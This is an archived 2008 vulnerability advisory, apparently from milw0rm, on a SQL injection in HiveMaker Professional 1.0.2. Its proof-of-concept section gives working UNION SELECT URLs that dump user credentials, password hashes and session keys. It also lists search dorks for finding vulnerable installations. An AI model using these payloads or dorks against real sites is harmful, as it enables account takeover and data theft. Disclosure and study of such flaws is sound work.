@@ -1,0 +1,92 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_96$2008
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_96$2008] HiveMaker Professional <= 1.0.2 (cid) Sql Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : May, 30 th 2008
+Location       : Jakarta, Indonesia
+Web            : http://e-rdc.org/v1/news.php?readmore=91
+Critical Lvl   : Medium
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : HiveMaker Professional
+version       : <= 1.0.2
+Vendor        : http://www.hivemaker.com
+Description   :
+
+Hivemaker is a website creation system written in PHP. Users can create websites without knowing any HTML in a fashion similar to GeoCities. Users can select modules and VERY easily create contact forms, web counters and a variety of other content! Included is a website directory that allows all your users websites to be viewable to the general public.
+For administrators Hivemaker is easily upgradeable. Modules and templates can be installed as simply as uploading the new template. The content is then immediately ready to be used by your users. Full user administration functions are available as well as the ability to add banners to every user's website.
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "cid" parameter in index.php page is not properly verified before being used to sql query. 
+This can be exploited thru the browser and get the hash md5 password from users and also retrieve users session id.
+Successful exploitation requires that "magic_quotes" is off.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/[path]/sites/index.php?cid=-1%20union%20select%201,2,3,concat(uid,0x3a,username,0x3a,useremail,0x3a,userpass,0x3a,aid,0x3a,password_reminder,0x3a,confirmation_code),5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5%20from%20userinfo--
+
+http://www.target.com/[path]/sites/index.php?cid=-1%20union%20select%201,2,3,sesskey,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5%20from%20sessions--
+
+
+Dork:
+~~~~
+Google    : "Hivemaker" or "Hivemaker(TM) Control Panel Login"
+Altavista : "Hivemaker(TM) Control Panel Login"
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn on magic_quotes in php.ini
+ 
+
+Timeline:
+~~~~~~~~
+
+- 24 - 05 - 2008 bug found
+- 25 - 05 - 2008 vendor contacted
+- 30 - 05 - 2008 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, zautha my little angel, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az01,negative,the_hydra,neng chika, str0ke
+~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b
+~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,cR4SH3R,kuntua,stev_manado,nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2008-05-30]
